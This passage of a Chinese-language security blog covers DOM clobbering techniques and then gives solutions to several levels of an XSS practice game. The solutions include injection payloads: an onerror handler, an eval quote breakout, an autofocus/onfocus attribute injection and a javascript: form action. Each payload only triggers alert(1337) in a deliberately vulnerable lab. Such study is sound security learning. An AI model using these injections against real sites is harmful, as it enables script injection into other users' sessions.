string">'dt'</span><span class="token punctuation">,</span> <span class="token string">'dd'</span><span class="token punctuation">,</span> <span class="token string">'figure'</span><span class="token punctuation">,</span> <span class="token string">'figcaption'</span><span class="token punctuation">,</span> <span class="token string">'div'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'em'</span><span class="token punctuation">,</span> <span class="token string">'strong'</span><span class="token punctuation">,</span> <span class="token string">'small'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'cite'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'dfn'</span><span class="token punctuation">,</span> <span class="token string">'abbr'</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">,</span> <span class="token string">'samp'</span><span class="token punctuation">,</span> <span class="token string">'kbd'</span><span class="token punctuation">,</span> <span class="token string">'sub'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'mark'</span><span class="token punctuation">,</span> <span class="token string">'ruby'</span><span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">,</span> <span class="token string">'rp'</span><span class="token punctuation">,</span> <span class="token string">'bdi'</span><span class="token punctuation">,</span> <span class="token string">'bdo'</span><span class="token punctuation">,</span> <span class="token string">'span'</span><span class="token punctuation">,</span> <span class="token string">'br'</span><span class="token punctuation">,</span> <span class="token string">'wbr'</span><span class="token punctuation">,</span> <span class="token string">'ins'</span><span class="token punctuation">,</span> <span class="token string">'del'</span><span class="token punctuation">,</span> <span class="token string">'img'</span><span class="token punctuation">,</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span> <span class="token string">'embed'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'param'</span><span class="token punctuation">,</span> <span class="token string">'video'</span><span class="token punctuation">,</span> <span class="token string">'audio'</span><span class="token punctuation">,</span> <span class="token string">'source'</span><span class="token punctuation">,</span> <span class="token string">'track'</span><span class="token punctuation">,</span> <span class="token string">'canvas'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'area'</span><span class="token punctuation">,</span> <span class="token string">'svg'</span><span class="token punctuation">,</span> <span class="token string">'math'</span><span class="token punctuation">,</span> <span class="token string">'table'</span><span class="token punctuation">,</span> <span class="token string">'caption'</span><span class="token punctuation">,</span> <span class="token string">'colgroup'</span><span class="token punctuation">,</span> <span class="token string">'col'</span><span class="token punctuation">,</span> <span class="token string">'tbody'</span><span class="token punctuation">,</span> <span class="token string">'thead'</span><span class="token punctuation">,</span> <span class="token string">'tfoot'</span><span class="token punctuation">,</span> <span class="token string">'tr'</span><span class="token punctuation">,</span> <span class="token string">'td'</span><span class="token punctuation">,</span> <span class="token string">'th'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'fieldset'</span><span class="token punctuation">,</span> <span class="token string">'legend'</span><span class="token punctuation">,</span> <span class="token string">'label'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'button'</span><span class="token punctuation">,</span> <span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'datalist'</span><span class="token punctuation">,</span> <span class="token string">'optgroup'</span><span class="token punctuation">,</span> <span class="token string">'option'</span><span class="token punctuation">,</span> <span class="token string">'textarea'</span><span class="token punctuation">,</span> <span class="token string">'keygen'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'progress'</span><span class="token punctuation">,</span> <span class="token string">'meter'</span><span class="token punctuation">,</span> <span class="token string">'details'</span><span class="token punctuation">,</span> <span class="token string">'summary'</span><span class="token punctuation">,</span> <span class="token string">'menuitem'</span><span class="token punctuation">,</span> <span class="token string">'menu'</span><span class="token punctuation">]</span>            div<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>html<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>html<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    div<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' id=element1>'</span><span class="token operator">+</span><span class="token string">'&lt;'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' id=element2>'</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// console.log(div);</span>                    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>element1 <span class="token operator">&amp;&amp;</span> element1<span class="token punctuation">.</span>element2<span class="token punctuation">)</span><span class="token punctuation">{</span>                         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">','</span><span class="token operator">+</span>html<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出了这些。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701530292509.png" alt="1701530292509" width="5%" height="5%" /><p>比如这样就能取到值。</p><pre><code>&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a&gt;123&lt;/a&gt;        &lt;form id =&quot;a&quot;&gt;            &lt;select id =&quot;b&quot;&gt;c&lt;/select&gt;        &lt;/form&gt;        &lt;script&gt;            console.log(a.b);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="层级-集合取值三层取值"><a href="#层级-集合取值三层取值" class="headerlink" title="层级+ 集合取值三层取值"></a>层级+ 集合取值三层取值</h4><p>就是两者的结合</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>y<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>z</span><span class="token punctuation">></span></span>I've been clobbered<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">             <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>y<span class="token punctuation">.</span>z<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="自定义属性取值（还不是很理解）"><a href="#自定义属性取值（还不是很理解）" class="headerlink" title="自定义属性取值（还不是很理解）"></a>自定义属性取值（还不是很理解）</h4><p>上述例子中提到的许多属性都是由<code>name,id</code>这种属性来进行引用的。接下来让我们来找找别的属性能否直接引用。</p><p>这部分应该就是扩充利用面。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            html<span class="token operator">=</span>HTML elements array            <span class="token keyword">var</span> props<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>html<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                obj <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>prop <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' id=x '</span><span class="token operator">+</span>prop<span class="token operator">+</span><span class="token string">'="ddd">&lt;/'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'>'</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// console.log(1);</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ddd"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// console.log(123);</span>                            props<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>eee<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出了有九百多条。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701589219643.png" alt="1701589219643" width="5%" height="5%" /><p>比如这样</p><pre><code>var div=document.createElement(&#39;div&#39;)div.innerHTML=&#39;&lt;a id=&quot;test&quot; ping=123&gt;&#39;document.body.appendChild(div)</code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701589439645.png" alt="1701589439645" width="5%" height="5%" /><p>这部分还有个<code>nb</code>的操作就是<code>a</code>标签的<code>username</code>和<code>password</code>属性，他们是<code>a</code>标签的节点属性并不是<code>html</code>中定义的属性，这两个属性可以通过<code>url</code>的中的<code>username</code>字段和<code>password</code>字段提供，但是因为是<code>ftp</code>协议，所以需要补上<code>@</code>。当然，<code>http</code>协议也可以通过这样来取值。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ftp:Clobbered-username:Clobbered-Password@a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Clobbered-username</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Clobbered-password</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc:&lt;&gt;：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abc:&lt;<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">         <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//abc:&lt;></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="三级以上取值"><a href="#三级以上取值" class="headerlink" title="三级以上取值"></a>三级以上取值</h4><pre><code>&lt;iframe name=a srcdoc=&quot;&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&quot;&gt;&lt;/iframe&gt;&lt;script&gt;setTimeout(()=&gt;alert(a.b.c.d),500)&lt;/script&gt;</code></pre><p>上面用了<code>setTimeout</code>设置定时器，以保证<code>iframe</code>框架的加载完成。可以利用<code>style/link</code>来加载外部样式表来造成延迟：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>a</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;iframe srcdoc<span class="token punctuation">=</span><span class="token punctuation">'</span>&lt;a id<span class="token punctuation">=</span>c name<span class="token punctuation">=</span>d href<span class="token punctuation">=</span>cid:Clobbered<span class="token punctuation">></span>test&lt;/a<span class="token punctuation">></span>&lt;a id<span class="token punctuation">=</span>c<span class="token punctuation">></span><span class="token punctuation">'</span> name<span class="token punctuation">=</span>b<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token atrule"><span class="token rule">@import</span> <span class="token string">'//portswigger.net'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>b<span class="token punctuation">.</span>c<span class="token punctuation">.</span>d<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XSS-GAME"><a href="#XSS-GAME" class="headerlink" title="XSS GAME"></a>XSS GAME</h4><blockquote><p>这个靶场有些<code>dom</code>破坏题，直接刷一下把。</p></blockquote><h5 id="Ma-Spaghet"><a href="#Ma-Spaghet" class="headerlink" title="Ma Spaghet!"></a>Ma Spaghet!</h5><p>直接标签闭合后面的脏字符。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1337)<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Jeffff"><a href="#Jeffff" class="headerlink" title="Jeffff"></a>Jeffff</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>maname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">let</span> jeff <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'jeff'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"JEFFF"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> ma <span class="token operator">=</span> <span class="token string">""</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`ma = "Ma name </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>jeff<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        maname<span class="token punctuation">.</span>innerText <span class="token operator">=</span> ma    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为这里直接用了<code>eval</code>执行<code>js</code>，那么直接闭合引号打个<code>alert</code>就好了</p><pre class="line-numbers language-html"><code class="language-html">?jeff=";alert(1337);"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Ugandan-Knuckles"><a href="#Ugandan-Knuckles" class="headerlink" title="Ugandan Knuckles"></a>Ugandan Knuckles</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>uganda<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">let</span> wey <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'wey'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"do you know da wey?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wey <span class="token operator">=</span> wey<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[&lt;>]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    uganda<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token string">`&lt;input type="text" placeholder="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>wey<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" class="form-control">`</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了尖括号，貌似没办法逃逸，只能用<code>autofocus+onfocus</code>来打个<code>xss</code>了，值得注意的是处理完后面会有些奇怪的脏字符导致执行<code>xss</code>失败，所以后面给了个<code>href</code>。</p><pre class="line-numbers language-html"><code class="language-html">?wey="autofocus onfocus=alert(1337) href="#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Ricardo-Milos"><a href="#Ricardo-Milos" class="headerlink" title="Ricardo Milos"></a>Ricardo Milos</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ricardo<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>milos<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    ricardo<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'ricardo'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        ricardo<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里<code>form的action</code>是可控的，其实就是指定一个<code>url</code>。那么用伪协议即可。</p><pre><code>?ricardo=javascript:alert(1337)</code></pre><h5 id="Ah-That’s-Hawt"><a href="#Ah-That’s-Hawt" class="headerlink" title="Ah That’s Hawt"></a>Ah That’s Hawt</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>will<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    smith <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'markassbrownlee'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ah That's Hawt"</span><span class="token punctuation">)</span>    smith <span class="token operator">=</span> smith<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[\(\`\)\\]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    will<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> smith</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" 